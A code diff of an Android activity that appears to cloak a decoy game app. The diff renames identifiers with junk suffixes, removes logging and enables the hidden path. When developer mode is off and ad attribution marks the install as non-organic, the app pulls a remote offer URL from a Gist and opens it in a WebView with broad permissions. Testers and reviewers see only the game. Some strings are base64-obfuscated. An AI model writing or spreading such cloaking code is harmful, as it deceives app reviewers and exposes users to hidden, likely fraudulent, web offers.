@@ -1,7 +1,7 @@
 package com.lyurxu.jroek;
 
-import static com.lyurxu.jroek.F_B_K.strDeep;
-import static com.lyurxu.jroek.ParseStr.decode;
+import static com.lyurxu.jroek.FBKlyurxu.strDeeplyurxu;
+import static com.lyurxu.jroek.ParseStrlyurxu.decodlyurxue;
 
 import android.app.Activity;
 import android.content.Context;
@@ -11,7 +11,6 @@ import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
-import android.util.Log;
 import android.view.View;
 import android.webkit.PermissionRequest;
 import android.webkit.ValueCallback;
@@ -34,108 +33,101 @@ import retrofit2.Response;
 import retrofit2.Retrofit;
 
 public class LJ extends AppCompatActivity {
-    private ProgressBar progressBar;
-    private WebView webView;
-    private String link;
-    private ValueCallback<Uri[]> myFilePathCallback;
-    private SharedPreferences sPrefs;
-    private String offer;
-    private String fb_Id;
-    public static final String URL_SHARED_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
-    public static final int INPUT_FILE_REQUEST_CODE = 1;
-    public static String keyDefault;
-    public static String statusAppsFlyer;
-    public static String strAppsFlyer;
-    public static String AppsFl_Id;
-    public static boolean afLoaded = false;
-    public static boolean adIdInited;
-
-    public static String AD_ID;
+    private ProgressBar progressBarlyurxu;
+    private WebView webViewlyurxu;
+    private String linklyurxu;
+    private ValueCallback<Uri[]> myFilePathCallbacklyurxu;
+    private SharedPreferences sPrefslyurxu;
+    private String offerlyurxu;
+    private String fb_Idlyurxu;
+    public static final String URL_SHARED_PREFlyurxu = "TEFTVF9XZWJWaWV3X1VSTA==";
+    public static final int INPUT_FILE_REQUEST_CODElyurxu = 1;
+    public static String keyDefaultlyurxu;
+    public static String statusAppsFlyerlyurxu;
+    public static String strAppsFlyerlyurxu;
+    public static String AppsFl_Idlyurxu;
+    public static String AD_IDlyurxu;
 
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        progressBar = findViewById(R.id.progressBar);
+        progressBarlyurxu = findViewById(R.id.progressBar);
 
-        if (!devModeOff()) {    // TODO delete !
-            webView = findViewById(R.id.webView);
-            setWebView(webView);
+        if (devModeOfflyurxu()) {
+            webViewlyurxu = findViewById(R.id.webView);
+            setWebViewlyurxu(webViewlyurxu);
 
-            Retrofit retrofit = new Retrofit.Builder()
-                    .baseUrl(CNSTN.GistLink)
+            Retrofit retrofitlyurxu = new Retrofit.Builder()
+                    .baseUrl(CNSTNlyurxu.Gistklyurxu)
                     .build();
-            GistApi gistApi = retrofit.create(GistApi.class);
-            Call<ResponseBody> gistQuery = gistApi.getStringUrl();
-            gistQuery.enqueue(new Callback<ResponseBody>() {
+            GistApilyurxu gistApilyurxu = retrofitlyurxu.create(GistApilyurxu.class);
+            Call<ResponseBody> gistQuerylyurxu = gistApilyurxu.getStringUrllyurxu();
+            gistQuerylyurxu.enqueue(new Callback<ResponseBody>() {
                 @Override
                 public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {
                     if (response.isSuccessful() & response.body() != null) {
                         try {
-                            String url = response.body().string();
-                            String[] params = url.split("\\|");
-                            offer = params[0];
-                            keyDefault = params[1];
-                            fb_Id = params[2];
+                            String urllyurxu = response.body().string();
+                            String[] paramslyurxu = urllyurxu.split("\\|");
+                            offerlyurxu = paramslyurxu[0];
+                            keyDefaultlyurxu = paramslyurxu[1];
+                            fb_Idlyurxu = paramslyurxu[2];
 
-                            F_B_K facebook = new F_B_K(fb_Id, LJ.this);
-                            facebook.init();
+                            FBKlyurxu facebooklyurxu = new FBKlyurxu(fb_Idlyurxu, LJ.this);
+                            facebooklyurxu.initlyurxu();
 
-                            sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
-                            link = sPrefs.getString(URL_SHARED_PREF, null);
-                            // TODO uncomment
-//                            if (link != null) {
-//                                webView.loadUrl(link);
-//                            } else {
+                            sPrefslyurxu = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
+                            linklyurxu = sPrefslyurxu.getString(URL_SHARED_PREFlyurxu, null);
+                            if (linklyurxu != null) {
+                                webViewlyurxu.loadUrl(linklyurxu);
+                            } else {
                                 new Handler().postDelayed(new Runnable() {
                                     @Override
                                     public void run() {
-                                        startWebView(offer);
+                                        startWebViewlyurxu(offerlyurxu);
                                     }
-                                },5000);
-//                            }
+                                },4989);
+                            }
                         } catch (IOException e) {
                             e.printStackTrace();
                         }
                     } else {
-                        goToGame();
+                        goToGamelyurxu();
                     }
                 }
 
                 @Override
                 public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable t) {
-                    goToGame();
+                    goToGamelyurxu();
                 }
             });
 
         } else {
-            goToGame();
+            goToGamelyurxu();
         }
     }
 
 
-    private void goToGame() {
-        startActivity(new Intent(this, MMyGameActivity.class));
+    private void goToGamelyurxu() {
+        startActivity(new Intent(this, MMyGameActivitylyurxu.class));
         finish();
     }
 
-    void startWebView(String link) {
-        if (statusAppsFlyer != null && statusAppsFlyer.equals(decode("Tm9uLW9yZ2FuaWM="))) {
-            String url = link + strAppsFlyer;
-            Log.i("MyApp", "non-organic - " + url);
-            webView.loadUrl(url);
-        } else if (strDeep != null) {
-            String url = link + strDeep;
-            webView.loadUrl(url);
-            Log.i("MyApp", "deepLink - " + url);
+    void startWebViewlyurxu(String link) {
+        if (statusAppsFlyerlyurxu != null && statusAppsFlyerlyurxu.equals(decodlyurxue("Tm9uLW9yZ2FuaWM="))) {
+            String urllyurxu = link + strAppsFlyerlyurxu;
+            webViewlyurxu.loadUrl(urllyurxu);
+        } else if (strDeeplyurxu != null) {
+            String urllyurxu = link + strDeeplyurxu;
+            webViewlyurxu.loadUrl(urllyurxu);
         } else {
-            if (keyDefault.equals("NO")) {
-                goToGame();
+            if (keyDefaultlyurxu.equals(decodlyurxue("Tk8="))) {
+                goToGamelyurxu();
             } else {
-                String url = new ParseStr().parseOrganic(link);
-                Log.i("MyApp", "organic - " + url);
-                webView.loadUrl(url);
+                String urllyurxu = new ParseStrlyurxu().parseOrganiclyurxu(link);
+                webViewlyurxu.loadUrl(urllyurxu);
             }
         }
     }
@@ -143,35 +135,35 @@ public class LJ extends AppCompatActivity {
 
     @Override
     public void onBackPressed() {
-        webView.goBack();
+        webViewlyurxu.goBack();
     }
 
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
-        if (requestCode != INPUT_FILE_REQUEST_CODE || myFilePathCallback == null) {
+        if (requestCode != INPUT_FILE_REQUEST_CODElyurxu || myFilePathCallbacklyurxu == null) {
             super.onActivityResult(requestCode, resultCode, data);
             return;
         }
         if (resultCode == Activity.RESULT_OK & data != null) {
-            String dataString = data.getDataString();
-            Uri[] result = new Uri[]{Uri.parse(dataString)};
-            myFilePathCallback.onReceiveValue(result);
-            myFilePathCallback = null;
+            String dataStringlyurxu = data.getDataString();
+            Uri[] resultlyurxu = new Uri[]{Uri.parse(dataStringlyurxu)};
+            myFilePathCallbacklyurxu.onReceiveValue(resultlyurxu);
+            myFilePathCallbacklyurxu = null;
         }
     }
 
-    private boolean devModeOff() {
+    private boolean devModeOfflyurxu() {
         int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                 android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
         return devInt == 0;
     }
 
-    class MyWebChromeClient extends WebChromeClient {
+    class MyWebChromeClientlyurxu extends WebChromeClient {
         @Override
         public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
-            myFilePathCallback = filePathCallback;
-            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decode("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODE);
+            myFilePathCallbacklyurxu = filePathCallback;
+            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decodlyurxue("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODElyurxu);
             return true;
         }
 
@@ -181,15 +173,15 @@ public class LJ extends AppCompatActivity {
         }
     }
 
-    class MyWebViewClient extends WebViewClient {
+    class MyWebViewClientlyurxu extends WebViewClient {
         @Override
         public void onPageStarted(WebView view, String url, Bitmap favicon) {
             super.onPageStarted(view, url, favicon);
-            webView.setVisibility(View.VISIBLE);
-            progressBar.setVisibility(ProgressBar.INVISIBLE);
+            webViewlyurxu.setVisibility(View.VISIBLE);
+            progressBarlyurxu.setVisibility(ProgressBar.INVISIBLE);
 
-            if (url.contains(decode("NDA0"))) {
-                goToGame();
+            if (url.contains(decodlyurxue("NDA0"))) {
+                goToGamelyurxu();
                 finish();
             }
         }
@@ -197,13 +189,13 @@ public class LJ extends AppCompatActivity {
         @Override
         public void onPageFinished(WebView view, String url) {
             super.onPageFinished(view, url);
-            SharedPreferences.Editor editor = sPrefs.edit();
-            editor.putString(URL_SHARED_PREF, url);
+            SharedPreferences.Editor editor = sPrefslyurxu.edit();
+            editor.putString(URL_SHARED_PREFlyurxu, url);
             editor.apply();
         }
     }
 
-    private void setWebView(WebView webViewetgpy) {
+    private void setWebViewlyurxu(WebView webViewetgpy) {
         webViewetgpy.getSettings().setJavaScriptEnabled(true);
         webViewetgpy.getSettings().setAppCacheEnabled(true);
         webViewetgpy.getSettings().setDomStorageEnabled(true);
@@ -225,8 +217,8 @@ public class LJ extends AppCompatActivity {
         webViewetgpy.getSettings().setAllowFileAccess(true);
         webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
         webViewetgpy.getSettings().setEnableSmoothTransition(true);
-        webViewetgpy.setWebChromeClient(new MyWebChromeClient());
-        webViewetgpy.setWebViewClient(new MyWebViewClient());
+        webViewetgpy.setWebChromeClient(new MyWebChromeClientlyurxu());
+        webViewetgpy.setWebViewClient(new MyWebViewClientlyurxu());
     }
 }
 
